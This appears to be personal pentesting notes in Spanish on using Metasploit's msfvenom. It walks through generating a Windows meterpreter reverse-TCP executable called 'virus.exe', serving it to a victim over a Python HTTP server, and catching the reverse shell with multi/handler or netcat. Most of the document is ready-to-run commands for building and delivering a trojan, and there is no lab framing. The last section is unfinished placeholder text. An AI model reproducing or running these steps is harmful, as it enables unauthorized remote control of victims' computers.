1. Teoría:
	- *MSFVENOM* es una herramienta de *Metasploit* que sirve para generar archivos maliciosos ejecutables (.exe, .php ...).

	- Tienes que seleccionar el *Payload* que necesites depende del sistema operativo de la victima y de lo que quieras conseguir con el archivo malicioso.
	
	- Con esta herramienta estarás generando un *Payload* personalizado en el formato que tu quieras (.exe, .php ...)
	
	- ***En este caso:*** Archivo malicioso == *Payload* personalizado.

2. Sintaxis:
	1. Victima Windows (en caso de que la victima sea otro sistema operativo habrá que **buscar en Internet que *Payload* usar** o utilizar el comando **show payloads** en **Metasploit**):
	```
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.136 LPORT=443 -f exe -o virus.exe
	```
	
	- *-p:* Elegir el *Payload*.
	- *windows/x64/meterpreter/reverse_tcp:* *Payload* que has elegido para tu archivo malicioso.
	- *LHOST:* IP atacante (Tu IP). Donde vas a recibir la *reverse shell*.
	- *LPORT:* El puerto por el que quieres recibir la *Reverse Shell* de la victima.
	- *-f:* Elegir el formato del archivo malicioso (.exe, .php ...).
	- *exe:* Formato que has elegido para el archivo malicioso (el archivo será un archivo ejecutable .exe)
	- *-o:* Elegir el nombre del archivo malicioso.
	- *virus.exe:* Nombre que has elegido para el archivo malicioso (el archivo malicioso ejecutable se llamará *virus.exe*).
	
3. Maneras para usar MSFVENOM y como hacerlo:
	1. Compartirlo con la victima:
		1. con **METASPLOIT:**
			1. sudo python3 -m http.server 80 (la victima se descarga el archivo malicioso buscando la IP atacante en el navegador crome, firefox...)
		
			2. Iniciar Metasploit:
			```
			msfconsole
			```

			3. Utilizar el ***/multi/handler***:
			```
			use /multi/handler
			```
			- Tambien por si acaso se puede poner el comando ***search /multi/handler*** en Metasploit y luego ***use 6*** (se llama *exploit/multi/handler*).

			4. Editar el *Exploit* y cambiar el *Payload* por el que elegimos usando ***MSFVENOM***.
			```
			set PAYLOAD windows/x64/meterpreter/reverse_tcp
			```
		
			```
			show options
			```
		
			```
			set lport 443
			```
		
			```
			set lhost 192.168.1.136
			```

			5.   Ejecutar el *Exploit* (**run** o **exploit**):
			```
			run
			```

		2. Con **NETCAT:**
			1. Poner el puerto seleccionado en MSFVENOM en escucha utilizando **NETCAT**:
			```
			 sudo nc -nlvp 443
			```
			2. Cuando la victima inicie el archivo malicioso ganaras la reverse shell de tu victima:
			```
			$ whoami
			victima
			```
			
	2. Subirlo a paneles de subida de archivos (fotos de perfil...)
		1. sdgh
		2. dsfg